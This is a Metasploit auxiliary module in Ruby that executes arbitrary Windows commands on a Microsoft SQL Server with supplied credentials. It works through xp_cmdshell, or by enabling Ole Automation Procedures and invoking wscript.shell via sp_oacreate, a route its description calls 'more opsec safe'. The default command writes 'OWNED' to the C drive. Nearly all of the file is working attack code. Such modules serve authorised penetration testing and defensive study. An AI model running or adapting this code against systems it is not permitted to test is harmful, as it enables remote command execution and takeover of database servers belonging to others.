##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::OptionalSession::MSSQL

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft SQL Server Command Execution',
        'Description' => %q{
          This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell (default) or the
          sp_oacreate procedure (more opsec safe, no output, no temporary data table). A valid username and password is
          required to use this module.
        },
        'Author' => [
          'tebo <tebo[at]attackresearch.com>',
          'arcc <pw[at]evait.de>'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'],
          [ 'URL', 'https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'Command to execute', 'cmd.exe /c echo OWNED > C:\\owned.exe']),
      OptEnum.new('TECHNIQUE', [true, 'Technique to use for command execution', 'xp_cmdshell', ['xp_cmdshell', 'sp_oacreate']])
    ])
  end

  def run
    if session
      set_mssql_session(session.client)
    else
      unless mssql_login_datastore
        print_error('Error with mssql_login call')
        info = mssql_client.initial_connection_info
        if info[:errors] && !info[:errors].empty?
          info[:errors].each do |err|
            print_error(err)
          end
        end
        return
      end
    end

    technique = datastore['TECHNIQUE']
    case technique
    when 'xp_cmdshell'
      begin
        mssql_xpcmdshell(datastore['CMD'], true)
      rescue RuntimeError
        print_status('Error while running "xp_cmdshell" method...retrying with "sp_oacreate" method')
        mssql_spoacreate
      end
    when 'sp_oacreate'
      mssql_spoacreate
    end
  end

  def mssql_spoacreate
    doprint = datastore['VERBOSE']
    print_status('Enabling advanced options and ole automation procedures.')
    mssql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", doprint)
    mssql_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", doprint)
    print_good('Executing command using sp_oacreate. No output will be displayed.')
    mssql_query("DECLARE @mssql INT; EXEC sp_oacreate 'wscript.shell',@mssql OUTPUT; EXEC sp_oamethod @mssql, 'run', null, '#{datastore['CMD']}';", doprint)
  end
end
